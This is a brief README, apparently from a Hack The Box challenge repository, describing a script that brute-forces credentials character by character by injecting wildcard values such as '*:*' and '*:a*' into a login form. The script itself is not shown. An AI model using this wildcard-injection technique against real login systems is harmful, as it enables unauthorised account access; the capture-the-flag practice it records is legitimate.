# Bruteforce

These scripts were used in [Hack The Box](https://www.hackthebox.com/) challenges:

## [`bruteforce_usernames.py`](bruteforce_usernames.py)

I had to find the correct username/password for users so we wrote a script that bruteforce single characters for one of the fileds in the Post
the login was successfull entering `*:*` so trying `*:a*` could make us find a correct password...
